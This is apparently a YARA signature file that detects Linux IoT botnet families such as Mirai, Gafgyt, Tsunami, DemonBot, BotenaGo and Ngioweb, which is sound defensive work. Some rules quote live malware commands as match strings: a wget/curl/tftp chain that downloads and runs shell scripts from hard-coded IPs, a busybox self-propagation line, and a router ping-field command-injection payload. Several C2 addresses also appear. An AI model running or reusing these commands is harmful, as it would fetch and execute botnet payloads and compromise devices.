import "elf"
import "hash"
include "rules/magics.yar"


rule Mirai_a_SecH {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Detect some Mirai's variants including Gafgyt and Tsunami variants (named by ClamAV) using section hash"
    // file fa9878*95ec37, compiled Py
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "b748e0aa34cc3bb4dcf0f803be00e8ae"
    )
}

rule Mirai_b_SecH {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Detect some Mirai's variants (named by ClamAV) using section hash"
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "90d8eebc2a34162c49ec31cfc660cec1"
    )
}

rule Mirai_Gafgyt_SecH {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Detect some Mirai's variants including Gafgyt variants (named by ClamAV) using section hash"
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "68dd3bd106aab3e99d9a65e4f9bfa7f1" or
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "a4b1a9d3f3622ccb54e615de8005f87f"
    )
}

rule Mirai_Tsunami_SecH
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Gafgyt-Jm (Avast named) or Tsunami Botnet (FireEye and other), 1 backdoor and 1 used for Dirtycow exploit"
    // Fixme false positive of idea-IU and powershell
  condition:
    is_elf and
    for any i in (0 .. elf.number_of_sections - 1): (
      hash.md5(elf.sections[i].offset, elf.sections[i].size) == "a7b6569072c6f43a2072b8ef906a2bf9"
    )
}

rule Mirai_DemonBot_SecH
{
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Mirai's variant DemonBot"
    reference = "https://otx.alienvault.com/malware/Backdoor:Linux%2FDemonBot/fileSamples"
    date = "12/11/2021"
    target = "File, memory"
  strings:
    $cc = "54.38.218.178"
    $file_str = "/proc/net/route"
    $str_1 = "PozHlpiND4xPDPuGE6tq"
    $str_2 = "tg57YSAcuvy2hdBlEWMv"
    $str_3 = "VaDp3Vu5m5bKcfCU96RX"
    $str_4 = "UBWcPjIZOdZ9IAOSZAy6"
    $str_5 = "JezacHw4VfzRWzsglZlF"
    $str_6 = "3zOWSvAY2dn9rKZZOfkJ"
    $str_7 = "oqogARpMjAvdjr9Qsrqj"
    $str_8 = "yQAkUvZFjxExI3WbDp2g"
    $str_9 = "35arWHE38SmV9qbaEDzZ"
    $str_10 = "kKbPlhAwlxxnyfM3LaL0"
    $str_11 = "a7pInUoLgx1CPFlGB5JF"
    $str_12 = "yFnlmG7bqbW682p7Bzey"
    $str_13 = "S1mQMZYF6uLzzkiULnGF"
    $str_14 = "jKdmCH3hamvbN7ZvzkNA"
    $str_15 = "bOAFqQfhvMFEf9jEZ89M"
    $str_16 = "VckeqgSPaAA5jHdoFpCC"
    $str_17 = "CwT01MAGqrgYRStHcV0X"
    $str_18 = "72qeggInemBIQ5uJc1jQ"
    $str_19 = "zwcfbtGDTDBWImROXhdn"
  condition:
    ($cc and $file_str) or any of ($str*)
}

rule Shellshock {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Shellshock.A"
    reference = "https://otx.alienvault.com/indicator/file/88ab21215c71fe88b04ab7b0e6a882a65c25df5aed79232f495f4bdb4c9a3600"
    date = "12/11/2021"
    target = "File, memory"
  strings:
    $addr_1 = "http://195.58.39.37/bins.sh"
    $addr_2 = "185.172.110.209"
    $addr_3 = "195.58.39.37"
    $str_1 = "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'"
    $str_2 = "cd /tmp; wget http://195.58.39.37/bins.sh || curl -O http://195.58.39.37/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 195.58.39.37 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 195.58.39.37; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh"
  condition:
    any of them
}

rule Tsunami_1 {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    description = "Tsunami"
    reference = "https://www.virustotal.com/gui/file/305901aa920493695729132cfd20cbddc9db2cf861071450a646c6a07b4a50f3"
    date = "13/11/2021"
    target = "File, memory"
  strings:
    $ = { 57 48 4F 20 25 73 } // "WHO %s"
    $ = { 50 4F 4E 47 20 25 73 } // "PONG %s"
  condition:
    all of them
}


rule BotenaGo {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "29/11/2021"
    reference = "https://otx.alienvault.com/indicator/file/2993eaf466f70bf89fec5fa950bf83c09f8b64343d6a121fa1d8988af4ea6ca2"
    reference = "https://otx.alienvault.com/indicator/file/0c395715bfeb8f89959be721cd2f614d2edb260614d5a21e90cc4c142f5d83ad"
    reference = "https://cybersecurity.att.com/blogs/labs-research/att-alien-labs-finds-new-golang-malwarebotenago-targeting-millions-of-routers-and-iot-devices-with-more-than-30-exploits"
  strings:
    $1 = "/bin/busybox wget -g 159.65.232.56 -l /tmp/xvg -r /xvg; /bin/busybox chmod 777 * /tmp/xvg; /tmp/xvg selfrep.huawei"
    $2 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://"
    $3 = "107.172.30.215"
    $4 = "159.65.232.56"
    $5 = "http://adminisp:adminispbad"
  condition:
    any of them
}


rule Mirai_variant_1 {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "15/11/2021"
    target = "File, Memory"
    status = "Tested, confirmed with processes"
    description = "Strings from dumped mem"
    hash = "a9878bffe5e771bd09109df185dc41883ca0a560bb7b635abddc4259995ec37"
  strings:
    $cc = { 31 39 34 2E 37 36 2E 32 32 36 2E 32 34 30 } // "194.76.226.240"
    $s1 = { 44 65 76 69 63 65 20 43 6F 6E 6E 65 63 74 65 64 3A 20 25 73 20 7C 20 50 6F 72 74 3A 20 25 73 20 7C 20 41 72 63 68 3A 20 25 73 } // "Device Connected: %s | Port: %s | Arch: %s"
    $s2 = { 54 53 6F 75 72 63 65 20 45 6E 67 69 6E 65 20 51 75 65 72 79 } // "TSource Engine Query"
    $s3 = { 4C 33 33 54 20 48 61 78 45 72 53 } // "L33T HaxErS"
    $s4 = { 6E 70 78 58 6F 75 64 69 66 46 65 45 67 47 61 41 43 53 63 73 } //"npxXoudifFeEgGaACScs" // Uniq string found in many Mirai's binaries
  condition:
    $cc or ($s2 and ($s1 or $s3)) or $s4
}

rule Flooder_a_Generic {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "15/11/2021"
    target = "File, Memory"
    hash = "123e6d1138bfd58de1173818d82b504ef928d5a3be7756dd627c594de4aad096"
  strings:
    $1 = { 4F 70 65 6E 69 6E 67 20 73 6F 63 6B 65 74 73 } // "Opening sockets"
    $2 = { 53 65 6E 64 69 6E 67 20 61 74 74 61 63 6B } // "Sending attack"
  condition:
    all of them
}

rule Ngioweb_a {
  meta:
    author = "Nong Hoang Tu"
    email = "dmknght@parrotsec.org"
    date = "25/12/2021"
    target = "File, memory"
    hash = "524df78615ffb007a0d7a9aafcedf918c0568200f95c6936767aa3931a81c7cd" // UPX binary
    hash = "0b213e1f92a2613f7cebff82e8ffbdae985e3446960bf4bd365b5751efa08b53" // Packed UPX binary
    description = "String detection for Ngioweb memory scan. Static file was detected by section hash"
  strings:
    $1 = { 44 24 38 4C 3B 7C } // "D$8L;|"
    $2 = { 24 44 33 37 44 31 } // "$D37D1"
  condition:
    all of them
}